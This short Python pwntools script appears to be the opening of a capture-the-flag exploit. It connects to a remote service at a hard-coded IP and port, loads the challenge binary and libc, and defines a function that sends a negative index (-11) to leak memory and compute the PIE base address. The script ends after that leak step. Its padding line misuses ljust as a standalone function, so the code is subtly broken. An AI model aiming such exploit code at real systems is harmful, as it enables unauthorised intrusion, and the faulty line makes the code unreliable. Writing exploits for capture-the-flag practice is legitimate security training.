from pwn import *

r = remote("3.38.195.222", 5555)
e = ELF("/mnt/c/Users/Storm/ctf/share/haha")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

def pie_base() :
    r.sendafter(">> ", str(3))
    r.sendafter("index: ", str(-11))
    r.recvuntil("data: ")
    return u64(r.recv(6) + ljust(8, b'\x00')) - 8


